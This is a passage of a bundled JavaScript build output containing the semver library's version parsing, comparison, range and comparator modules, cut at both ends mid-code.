            this.prerelease = [];
            break;
          case "minor":
            if (this.patch !== 0 || this.prerelease.length === 0) {
              this.minor++;
            }
            this.patch = 0;
            this.prerelease = [];
            break;
          case "patch":
            if (this.prerelease.length === 0) {
              this.patch++;
            }
            this.prerelease = [];
            break;
          // This probably shouldn't be used publicly.
          // 1.0.0 'pre' would become 1.0.0-0 which is the wrong direction.
          case "pre": {
            const base = Number(identifierBase) ? 1 : 0;
            if (this.prerelease.length === 0) {
              this.prerelease = [base];
            } else {
              let i = this.prerelease.length;
              while (--i >= 0) {
                if (typeof this.prerelease[i] === "number") {
                  this.prerelease[i]++;
                  i = -2;
                }
              }
              if (i === -1) {
                if (identifier === this.prerelease.join(".") && identifierBase === false) {
                  throw new Error("invalid increment argument: identifier already exists");
                }
                this.prerelease.push(base);
              }
            }
            if (identifier) {
              let prerelease = [identifier, base];
              if (identifierBase === false) {
                prerelease = [identifier];
              }
              if (isPrereleaseIdentifier(this.prerelease, identifier)) {
                const prereleaseBase = this.prerelease[identifier.split(".").length];
                if (isNaN(prereleaseBase)) {
                  this.prerelease = prerelease;
                }
              } else {
                this.prerelease = prerelease;
              }
            }
            break;
          }
          default:
            throw new Error(`invalid increment argument: ${release}`);
        }
        this.raw = this.format();
        if (this.build.length) {
          this.raw += `+${this.build.join(".")}`;
        }
        return this;
      }
    };
    module2.exports = SemVer;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/parse.js
var require_parse = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/parse.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var parse3 = (version, options, throwErrors = false) => {
      if (version instanceof SemVer) {
        return version;
      }
      try {
        return new SemVer(version, options);
      } catch (er) {
        if (!throwErrors) {
          return null;
        }
        throw er;
      }
    };
    module2.exports = parse3;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/valid.js
var require_valid = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/valid.js"(exports2, module2) {
    "use strict";
    var parse3 = require_parse();
    var valid5 = (version, options) => {
      const v = parse3(version, options);
      return v ? v.version : null;
    };
    module2.exports = valid5;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/clean.js
var require_clean = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/clean.js"(exports2, module2) {
    "use strict";
    var parse3 = require_parse();
    var clean = (version, options) => {
      const s = parse3(version.trim().replace(/^[=v]+/, ""), options);
      return s ? s.version : null;
    };
    module2.exports = clean;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/inc.js
var require_inc = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/inc.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var inc = (version, release, options, identifier, identifierBase) => {
      if (typeof options === "string") {
        identifierBase = identifier;
        identifier = options;
        options = void 0;
      }
      try {
        return new SemVer(
          version instanceof SemVer ? version.version : version,
          options
        ).inc(release, identifier, identifierBase).version;
      } catch (er) {
        return null;
      }
    };
    module2.exports = inc;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/diff.js
var require_diff = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/diff.js"(exports2, module2) {
    "use strict";
    var parse3 = require_parse();
    var diff2 = (version1, version2) => {
      const v1 = parse3(version1, null, true);
      const v2 = parse3(version2, null, true);
      const comparison = v1.compare(v2);
      if (comparison === 0) {
        return null;
      }
      const v1Higher = comparison > 0;
      const highVersion = v1Higher ? v1 : v2;
      const lowVersion = v1Higher ? v2 : v1;
      const highHasPre = !!highVersion.prerelease.length;
      const lowHasPre = !!lowVersion.prerelease.length;
      if (lowHasPre && !highHasPre) {
        if (!lowVersion.patch && !lowVersion.minor) {
          return "major";
        }
        if (lowVersion.compareMain(highVersion) === 0) {
          if (lowVersion.minor && !lowVersion.patch) {
            return "minor";
          }
          return "patch";
        }
      }
      const prefix = highHasPre ? "pre" : "";
      if (v1.major !== v2.major) {
        return prefix + "major";
      }
      if (v1.minor !== v2.minor) {
        return prefix + "minor";
      }
      if (v1.patch !== v2.patch) {
        return prefix + "patch";
      }
      return "prerelease";
    };
    module2.exports = diff2;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/major.js
var require_major = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/major.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var major = (a, loose) => new SemVer(a, loose).major;
    module2.exports = major;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/minor.js
var require_minor = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/minor.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var minor = (a, loose) => new SemVer(a, loose).minor;
    module2.exports = minor;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/patch.js
var require_patch = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/patch.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var patch = (a, loose) => new SemVer(a, loose).patch;
    module2.exports = patch;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/prerelease.js
var require_prerelease = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/prerelease.js"(exports2, module2) {
    "use strict";
    var parse3 = require_parse();
    var prerelease = (version, options) => {
      const parsed = parse3(version, options);
      return parsed && parsed.prerelease.length ? parsed.prerelease : null;
    };
    module2.exports = prerelease;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/compare.js
var require_compare = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/compare.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var compare3 = (a, b, loose) => new SemVer(a, loose).compare(new SemVer(b, loose));
    module2.exports = compare3;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/rcompare.js
var require_rcompare = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/rcompare.js"(exports2, module2) {
    "use strict";
    var compare3 = require_compare();
    var rcompare = (a, b, loose) => compare3(b, a, loose);
    module2.exports = rcompare;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/compare-loose.js
var require_compare_loose = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/compare-loose.js"(exports2, module2) {
    "use strict";
    var compare3 = require_compare();
    var compareLoose = (a, b) => compare3(a, b, true);
    module2.exports = compareLoose;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/compare-build.js
var require_compare_build = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/compare-build.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var compareBuild = (a, b, loose) => {
      const versionA = new SemVer(a, loose);
      const versionB = new SemVer(b, loose);
      return versionA.compare(versionB) || versionA.compareBuild(versionB);
    };
    module2.exports = compareBuild;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/sort.js
var require_sort = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/sort.js"(exports2, module2) {
    "use strict";
    var compareBuild = require_compare_build();
    var sort = (list, loose) => list.sort((a, b) => compareBuild(a, b, loose));
    module2.exports = sort;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/rsort.js
var require_rsort = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/rsort.js"(exports2, module2) {
    "use strict";
    var compareBuild = require_compare_build();
    var rsort2 = (list, loose) => list.sort((a, b) => compareBuild(b, a, loose));
    module2.exports = rsort2;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/gt.js
var require_gt = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/gt.js"(exports2, module2) {
    "use strict";
    var compare3 = require_compare();
    var gt = (a, b, loose) => compare3(a, b, loose) > 0;
    module2.exports = gt;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/lt.js
var require_lt = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/lt.js"(exports2, module2) {
    "use strict";
    var compare3 = require_compare();
    var lt = (a, b, loose) => compare3(a, b, loose) < 0;
    module2.exports = lt;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/eq.js
var require_eq = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/eq.js"(exports2, module2) {
    "use strict";
    var compare3 = require_compare();
    var eq = (a, b, loose) => compare3(a, b, loose) === 0;
    module2.exports = eq;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/neq.js
var require_neq = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/neq.js"(exports2, module2) {
    "use strict";
    var compare3 = require_compare();
    var neq = (a, b, loose) => compare3(a, b, loose) !== 0;
    module2.exports = neq;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/gte.js
var require_gte = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/gte.js"(exports2, module2) {
    "use strict";
    var compare3 = require_compare();
    var gte2 = (a, b, loose) => compare3(a, b, loose) >= 0;
    module2.exports = gte2;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/lte.js
var require_lte = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/lte.js"(exports2, module2) {
    "use strict";
    var compare3 = require_compare();
    var lte2 = (a, b, loose) => compare3(a, b, loose) <= 0;
    module2.exports = lte2;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/cmp.js
var require_cmp = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/cmp.js"(exports2, module2) {
    "use strict";
    var eq = require_eq();
    var neq = require_neq();
    var gt = require_gt();
    var gte2 = require_gte();
    var lt = require_lt();
    var lte2 = require_lte();
    var cmp = (a, op, b, loose) => {
      switch (op) {
        case "===":
          if (typeof a === "object") {
            a = a.version;
          }
          if (typeof b === "object") {
            b = b.version;
          }
          return a === b;
        case "!==":
          if (typeof a === "object") {
            a = a.version;
          }
          if (typeof b === "object") {
            b = b.version;
          }
          return a !== b;
        case "":
        case "=":
        case "==":
          return eq(a, b, loose);
        case "!=":
          return neq(a, b, loose);
        case ">":
          return gt(a, b, loose);
        case ">=":
          return gte2(a, b, loose);
        case "<":
          return lt(a, b, loose);
        case "<=":
          return lte2(a, b, loose);
        default:
          throw new TypeError(`Invalid operator: ${op}`);
      }
    };
    module2.exports = cmp;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/coerce.js
var require_coerce = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/coerce.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var parse3 = require_parse();
    var { safeRe: re, t } = require_re();
    var coerce2 = (version, options) => {
      if (version instanceof SemVer) {
        return version;
      }
      if (typeof version === "number") {
        version = String(version);
      }
      if (typeof version !== "string") {
        return null;
      }
      options = options || {};
      let match = null;
      if (!options.rtl) {
        match = version.match(options.includePrerelease ? re[t.COERCEFULL] : re[t.COERCE]);
      } else {
        const coerceRtlRegex = options.includePrerelease ? re[t.COERCERTLFULL] : re[t.COERCERTL];
        let next;
        while ((next = coerceRtlRegex.exec(version)) && (!match || match.index + match[0].length !== version.length)) {
          if (!match || next.index + next[0].length !== match.index + match[0].length) {
            match = next;
          }
          coerceRtlRegex.lastIndex = next.index + next[1].length + next[2].length;
        }
        coerceRtlRegex.lastIndex = -1;
      }
      if (match === null) {
        return null;
      }
      const major = match[2];
      const minor = match[3] || "0";
      const patch = match[4] || "0";
      const prerelease = options.includePrerelease && match[5] ? `-${match[5]}` : "";
      const build = options.includePrerelease && match[6] ? `+${match[6]}` : "";
      return parse3(`${major}.${minor}.${patch}${prerelease}${build}`, options);
    };
    module2.exports = coerce2;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/truncate.js
var require_truncate = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/truncate.js"(exports2, module2) {
    "use strict";
    var parse3 = require_parse();
    var constants2 = require_constants();
    var SemVer = require_semver();
    var truncate = (version, truncation, options) => {
      if (!constants2.RELEASE_TYPES.includes(truncation)) {
        return null;
      }
      const clonedVersion = cloneInputVersion(version, options);
      return clonedVersion && doTruncation(clonedVersion, truncation);
    };
    var cloneInputVersion = (version, options) => {
      const versionStringToParse = version instanceof SemVer ? version.version : version;
      return parse3(versionStringToParse, options);
    };
    var doTruncation = (version, truncation) => {
      if (isPrerelease(truncation)) {
        return version.version;
      }
      version.prerelease = [];
      switch (truncation) {
        case "major":
          version.minor = 0;
          version.patch = 0;
          break;
        case "minor":
          version.patch = 0;
          break;
      }
      return version.format();
    };
    var isPrerelease = (type) => {
      return type.startsWith("pre");
    };
    module2.exports = truncate;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/lrucache.js
var require_lrucache = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/lrucache.js"(exports2, module2) {
    "use strict";
    var LRUCache = class {
      constructor() {
        this.max = 1e3;
        this.map = /* @__PURE__ */ new Map();
      }
      get(key) {
        const value = this.map.get(key);
        if (value === void 0) {
          return void 0;
        } else {
          this.map.delete(key);
          this.map.set(key, value);
          return value;
        }
      }
      delete(key) {
        return this.map.delete(key);
      }
      set(key, value) {
        const deleted = this.delete(key);
        if (!deleted && value !== void 0) {
          if (this.map.size >= this.max) {
            const firstKey = this.map.keys().next().value;
            this.delete(firstKey);
          }
          this.map.set(key, value);
        }
        return this;
      }
    };
    module2.exports = LRUCache;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/classes/range.js
var require_range = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/classes/range.js"(exports2, module2) {
    "use strict";
    var SPACE_CHARACTERS = /\s+/g;
    var Range = class _Range {
      constructor(range, options) {
        options = parseOptions(options);
        if (range instanceof _Range) {
          if (range.loose === !!options.loose && range.includePrerelease === !!options.includePrerelease) {
            return range;
          } else {
            return new _Range(range.raw, options);
          }
        }
        if (range instanceof Comparator) {
          this.raw = range.value;
          this.set = [[range]];
          this.formatted = void 0;
          return this;
        }
        this.options = options;
        this.loose = !!options.loose;
        this.includePrerelease = !!options.includePrerelease;
        this.raw = range.trim().replace(SPACE_CHARACTERS, " ");
        this.set = this.raw.split("||").map((r) => this.parseRange(r.trim())).filter((c) => c.length);
        if (!this.set.length) {
          throw new TypeError(`Invalid SemVer Range: ${this.raw}`);
        }
        if (this.set.length > 1) {
          const first = this.set[0];
          this.set = this.set.filter((c) => !isNullSet(c[0]));
          if (this.set.length === 0) {
            this.set = [first];
          } else if (this.set.length > 1) {
            for (const c of this.set) {
              if (c.length === 1 && isAny(c[0])) {
                this.set = [c];
                break;
              }
            }
          }
        }
        this.formatted = void 0;
      }
      get range() {
        if (this.formatted === void 0) {
          this.formatted = "";
          for (let i = 0; i < this.set.length; i++) {
            if (i > 0) {
              this.formatted += "||";
            }
            const comps = this.set[i];
            for (let k = 0; k < comps.length; k++) {
              if (k > 0) {
                this.formatted += " ";
              }
              this.formatted += comps[k].toString().trim();
            }
          }
        }
        return this.formatted;
      }
      format() {
        return this.range;
      }
      toString() {
        return this.range;
      }
      parseRange(range) {
        range = range.replace(BUILDSTRIPRE, "");
        const memoOpts = (this.options.includePrerelease && FLAG_INCLUDE_PRERELEASE) | (this.options.loose && FLAG_LOOSE);
        const memoKey = memoOpts + ":" + range;
        const cached = cache.get(memoKey);
        if (cached) {
          return cached;
        }
        const loose = this.options.loose;
        const hr = loose ? re[t.HYPHENRANGELOOSE] : re[t.HYPHENRANGE];
        range = range.replace(hr, hyphenReplace(this.options.includePrerelease));
        debug("hyphen replace", range);
        range = range.replace(re[t.COMPARATORTRIM], comparatorTrimReplace);
        debug("comparator trim", range);
        range = range.replace(re[t.TILDETRIM], tildeTrimReplace);
        debug("tilde trim", range);
        range = range.replace(re[t.CARETTRIM], caretTrimReplace);
        debug("caret trim", range);
        let rangeList = range.split(" ").map((comp) => parseComparator(comp, this.options)).join(" ").split(/\s+/).map((comp) => replaceGTE0(comp, this.options));
        if (loose) {
          rangeList = rangeList.filter((comp) => {
            debug("loose invalid filter", comp, this.options);
            return !!comp.match(re[t.COMPARATORLOOSE]);
          });
        }
        debug("range list", rangeList);
        const rangeMap = /* @__PURE__ */ new Map();
        const comparators = rangeList.map((comp) => new Comparator(comp, this.options));
        for (const comp of comparators) {
          if (isNullSet(comp)) {
            return [comp];
          }
          rangeMap.set(comp.value, comp);
        }
        if (rangeMap.size > 1 && rangeMap.has("")) {
          rangeMap.delete("");
        }
        const result = [...rangeMap.values()];
        cache.set(memoKey, result);
        return result;
      }
      intersects(range, options) {
        if (!(range instanceof _Range)) {
          throw new TypeError("a Range is required");
        }
        return this.set.some((thisComparators) => {
          return isSatisfiable(thisComparators, options) && range.set.some((rangeComparators) => {
            return isSatisfiable(rangeComparators, options) && thisComparators.every((thisComparator) => {
              return rangeComparators.every((rangeComparator) => {
                return thisComparator.intersects(rangeComparator, options);
              });
            });
          });
        });
      }
      // if ANY of the sets match ALL of its comparators, then pass
      test(version) {
        if (!version) {
          return false;
        }
        if (typeof version === "string") {
          try {
            version = new SemVer(version, this.options);
          } catch (er) {
            return false;
          }
        }
        for (let i = 0; i < this.set.length; i++) {
          if (testSet(this.set[i], version, this.options)) {
            return true;
          }
        }
        return false;
      }
    };
    module2.exports = Range;
    var LRU = require_lrucache();
    var cache = new LRU();
    var parseOptions = require_parse_options();
    var Comparator = require_comparator();
    var debug = require_debug();
    var SemVer = require_semver();
    var {
      safeRe: re,
      src,
      t,
      comparatorTrimReplace,
      tildeTrimReplace,
      caretTrimReplace
    } = require_re();
    var { FLAG_INCLUDE_PRERELEASE, FLAG_LOOSE } = require_constants();
    var BUILDSTRIPRE = new RegExp(src[t.BUILD], "g");
    var isNullSet = (c) => c.value === "<0.0.0-0";
    var isAny = (c) => c.value === "";
    var isSatisfiable = (comparators, options) => {
      let result = true;
      const remainingComparators = comparators.slice();
      let testComparator = remainingComparators.pop();
      while (result && remainingComparators.length) {
        result = remainingComparators.every((otherComparator) => {
          return testComparator.intersects(otherComparator, options);
        });
        testComparator = remainingComparators.pop();
      }
      return result;
    };
    var parseComparator = (comp, options) => {
      comp = comp.replace(re[t.BUILD], "");
      debug("comp", comp, options);
      comp = replaceCarets(comp, options);
      debug("caret", comp);
      comp = replaceTildes(comp, options);
      debug("tildes", comp);
      comp = replaceXRanges(comp, options);
      debug("xrange", comp);
      comp = replaceStars(comp, options);
      debug("stars", comp);
      return comp;
    };
    var isX = (id) => !id || id.toLowerCase() === "x" || id === "*";
    var invalidXRangeOrder = (M, m, p) => isX(M) && !isX(m) || isX(m) && p && !isX(p);
    var replaceTildes = (comp, options) => {
      return comp.trim().split(/\s+/).map((c) => replaceTilde(c, options)).join(" ");
    };
    var replaceTilde = (comp, options) => {
      const r = options.loose ? re[t.TILDELOOSE] : re[t.TILDE];
      const z = options.includePrerelease ? "-0" : "";
      return comp.replace(r, (_, M, m, p, pr) => {
        debug("tilde", comp, _, M, m, p, pr);
        let ret;
        if (isX(M)) {
          ret = "";
        } else if (isX(m)) {
          ret = `>=${M}.0.0${z} <${+M + 1}.0.0-0`;
        } else if (isX(p)) {
          ret = `>=${M}.${m}.0${z} <${M}.${+m + 1}.0-0`;
        } else if (pr) {
          debug("replaceTilde pr", pr);
          ret = `>=${M}.${m}.${p}-${pr} <${M}.${+m + 1}.0-0`;
        } else {
          ret = `>=${M}.${m}.${p} <${M}.${+m + 1}.0-0`;
        }
        debug("tilde return", ret);
        return ret;
      });
    };
    var replaceCarets = (comp, options) => {
      return comp.trim().split(/\s+/).map((c) => replaceCaret(c, options)).join(" ");
    };
    var replaceCaret = (comp, options) => {
      debug("caret", comp, options);
      const r = options.loose ? re[t.CARETLOOSE] : re[t.CARET];
      const z = options.includePrerelease ? "-0" : "";
      return comp.replace(r, (_, M, m, p, pr) => {
        debug("caret", comp, _, M, m, p, pr);
        let ret;
        if (isX(M)) {
          ret = "";
        } else if (isX(m)) {
          ret = `>=${M}.0.0${z} <${+M + 1}.0.0-0`;
        } else if (isX(p)) {
          if (M === "0") {
            ret = `>=${M}.${m}.0${z} <${M}.${+m + 1}.0-0`;
          } else {
            ret = `>=${M}.${m}.0${z} <${+M + 1}.0.0-0`;
          }
        } else if (pr) {
          debug("replaceCaret pr", pr);
          if (M === "0") {
            if (m === "0") {
              ret = `>=${M}.${m}.${p}-${pr} <${M}.${m}.${+p + 1}-0`;
            } else {
              ret = `>=${M}.${m}.${p}-${pr} <${M}.${+m + 1}.0-0`;
            }
          } else {
            ret = `>=${M}.${m}.${p}-${pr} <${+M + 1}.0.0-0`;
          }
        } else {
          debug("no pr");
          if (M === "0") {
            if (m === "0") {
              ret = `>=${M}.${m}.${p} <${M}.${m}.${+p + 1}-0`;
            } else {
              ret = `>=${M}.${m}.${p} <${M}.${+m + 1}.0-0`;
            }
          } else {
            ret = `>=${M}.${m}.${p} <${+M + 1}.0.0-0`;
          }
        }
        debug("caret return", ret);
        return ret;
      });
    };
    var replaceXRanges = (comp, options) => {
      debug("replaceXRanges", comp, options);
      return comp.split(/\s+/).map((c) => replaceXRange(c, options)).join(" ");
    };
    var replaceXRange = (comp, options) => {
      comp = comp.trim();
      const r = options.loose ? re[t.XRANGELOOSE] : re[t.XRANGE];
      return comp.replace(r, (ret, gtlt, M, m, p, pr) => {
        debug("xRange", comp, ret, gtlt, M, m, p, pr);
        if (invalidXRangeOrder(M, m, p)) {
          return comp;
        }
        const xM = isX(M);
        const xm = xM || isX(m);
        const xp = xm || isX(p);
        const anyX = xp;
        if (gtlt === "=" && anyX) {
          gtlt = "";
        }
        pr = options.includePrerelease ? "-0" : "";
        if (xM) {
          if (gtlt === ">" || gtlt === "<") {
            ret = "<0.0.0-0";
          } else {
            ret = "*";
          }
        } else if (gtlt && anyX) {
          if (xm) {
            m = 0;
          }
          p = 0;
          if (gtlt === ">") {
            gtlt = ">=";
            if (xm) {
              M = +M + 1;
              m = 0;
              p = 0;
            } else {
              m = +m + 1;
              p = 0;
            }
          } else if (gtlt === "<=") {
            gtlt = "<";
            if (xm) {
              M = +M + 1;
            } else {
              m = +m + 1;
            }
          }
          if (gtlt === "<") {
            pr = "-0";
          }
          ret = `${gtlt + M}.${m}.${p}${pr}`;
        } else if (xm) {
          ret = `>=${M}.0.0${pr} <${+M + 1}.0.0-0`;
        } else if (xp) {
          ret = `>=${M}.${m}.0${pr} <${M}.${+m + 1}.0-0`;
        }
        debug("xRange return", ret);
        return ret;
      });
    };
    var replaceStars = (comp, options) => {
      debug("replaceStars", comp, options);
      return comp.trim().replace(re[t.STAR], "");
    };
    var replaceGTE0 = (comp, options) => {
      debug("replaceGTE0", comp, options);
      return comp.trim().replace(re[options.includePrerelease ? t.GTE0PRE : t.GTE0], "");
    };
    var hyphenReplace = (incPr) => ($0, from, fM, fm, fp, fpr, fb, to, tM, tm, tp, tpr) => {
      if (isX(fM)) {
        from = "";
      } else if (isX(fm)) {
        from = `>=${fM}.0.0${incPr ? "-0" : ""}`;
      } else if (isX(fp)) {
        from = `>=${fM}.${fm}.0${incPr ? "-0" : ""}`;
      } else if (fpr) {
        from = `>=${from}`;
      } else {
        from = `>=${from}${incPr ? "-0" : ""}`;
      }
      if (isX(tM)) {
        to = "";
      } else if (isX(tm)) {
        to = `<${+tM + 1}.0.0-0`;
      } else if (isX(tp)) {
        to = `<${tM}.${+tm + 1}.0-0`;
      } else if (tpr) {
        to = `<=${tM}.${tm}.${tp}-${tpr}`;
      } else if (incPr) {
        to = `<${tM}.${tm}.${+tp + 1}-0`;
      } else {
        to = `<=${to}`;
      }
      return `${from} ${to}`.trim();
    };
    var testSet = (set, version, options) => {
      for (let i = 0; i < set.length; i++) {
        if (!set[i].test(version)) {
          return false;
        }
      }
      if (version.prerelease.length && !options.includePrerelease) {
        for (let i = 0; i < set.length; i++) {
          debug(set[i].semver);
          if (set[i].semver === Comparator.ANY) {
            continue;
          }
          if (set[i].semver.prerelease.length > 0) {
            const allowed = set[i].semver;
            if (allowed.major === version.major && allowed.minor === version.minor && allowed.patch === version.patch) {
              return true;
            }
          }
        }
        return false;
      }
      return true;
    };
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/classes/comparator.js
var require_comparator = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/classes/comparator.js"(exports2, module2) {
    "use strict";
    var ANY = /* @__PURE__ */ Symbol("SemVer ANY");
    var Comparator = class _Comparator {
      static get ANY() {
        return ANY;
      }
      constructor(comp, options) {
        options = parseOptions(options);
        if (comp instanceof _Comparator) {
          if (comp.loose === !!options.loose) {
            return comp;
          } else {
            comp = comp.value;
          }
        }
        comp = comp.trim().split(/\s+/).join(" ");
        debug("comparator", comp, options);
        this.options = options;
        this.loose = !!options.loose;
        this.parse(comp);
        if (this.semver === ANY) {
          this.value = "";
        } else {
          this.value = this.operator + this.semver.version;
        }
        debug("comp", this);
      }
      parse(comp) {
        const r = this.options.loose ? re[t.COMPARATORLOOSE] : re[t.COMPARATOR];
        const m = comp.match(r);
        if (!m) {
          throw new TypeError(`Invalid comparator: ${comp}`);
        }
        this.operator = m[1] !== void 0 ? m[1] : "";
        if (this.operator === "=") {
          this.operator = "";
        }
        if (!m[2]) {
          this.semver = ANY;
        } else {
          this.semver = new SemVer(m[2], this.options.loose);
        }
      }
      toString() {
        return this.value;
      }
      test(version) {
        debug("Comparator.test", version, this.options.loose);
        if (this.semver === ANY || version === ANY) {
          return true;
        }
        if (typeof version === "string") {
          try {
            version = new SemVer(version, this.options);
          } catch (er) {
            return false;
          }
        }
        return cmp(version, this.operator, this.semver, this.options);
      }
      intersects(comp, options) {
        if (!(comp instanceof _Comparator)) {
          throw new TypeError("a Comparator is required");
        }
        if (this.operator === "") {
          if (this.value === "") {
            return true;
          }
          return new Range(comp.value, options).test(this.value);
        } else if (comp.operator === "") {
          if (comp.value === "") {
            return true;
          }
          return new Range(this.value, options).test(comp.semver);
        }
        options = parseOptions(options);
        if (options.includePrerelease && (this.value === "<0.0.0-0" || comp.value === "<0.0.0-0")) {
          return false;
        }
        if (!options.includePrerelease && (this.value.startsWith("<0.0.0") || comp.value.startsWith("<0.0.0"))) {
          return false;
        }
        if (this.operator.startsWith(">") && comp.operator.startsWith(">")) {
          return true;
        }
        if (this.operator.startsWith("<") && comp.operator.startsWith("<")) {
          return true;
        }
        if (this.semver.version === comp.semver.version && this.operator.includes("=") && comp.operator.includes("=")) {
          return true;
        }
        if (cmp(this.semver, "<", comp.semver, options) && this.operator.startsWith(">") && comp.operator.startsWith("<")) {
          return true;
        }
        if (cmp(this.semver, ">", comp.semver, options) && this.operator.startsWith("<") && comp.operator.startsWith(">")) {
          return true;
        }
        return false;
      }
    };
    module2.exports = Comparator;
    var parseOptions = require_parse_options();
    var { safeRe: re, t } = require_re();
    var cmp = require_cmp();
    var debug = require_debug();
    var SemVer = require_semver();
    var Range = require_range();
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/satisfies.js
var require_satisfies = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/satisfies.js"(exports2, module2) {
    "use strict";
    var Range = require_range();
    var satisfies2 = (version, range, options) => {
      try {
        range = new Range(range, options);
      } catch (er) {
        return false;
      }
      return range.test(version);
    };
    module2.exports = satisfies2;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/to-comparators.js
var require_to_comparators = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/to-comparators.js"(exports2, module2) {
    "use strict";
    var Range = require_range();
    var toComparators = (range, options) => new Range(range, options).set.map((comp) => comp.map((c) => c.value).join(" ").trim().split(" "));
    module2.exports = toComparators;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/max-satisfying.js
var require_max_satisfying = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/max-satisfying.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var Range = require_range();
    var maxSatisfying2 = (versions, range, options) => {
      let max = null;
      let maxSV = null;
      let rangeObj = null;
      try {
        rangeObj = new Range(range, options);
      } catch (er) {
        return null;
      }
      versions.forEach((v) => {
        if (rangeObj.test(v)) {
          if (!max || maxSV.compare(v) === -1) {
            max = v;
            maxSV = new SemVer(max, options);
          }
        }
      });
      return max;
    };
    module2.exports = maxSatisfying2;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/min-satisfying.js
var require_min_satisfying = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/min-satisfying.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var Range = require_range();
    var minSatisfying = (versions, range, options) => {
      let min = null;
      let minSV = null;
      let rangeObj = null;
      try {
        rangeObj = new Range(range, options);
      } catch (er) {
        return null;
      }
      versions.forEach((v) => {
        if (rangeObj.test(v)) {
          if (!min || minSV.compare(v) === 1) {
            min = v;
            minSV = new SemVer(min, options);
          }
        }
      });
      return min;
    };
    module2.exports = minSatisfying;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/min-version.js
var require_min_version = __commonJS({
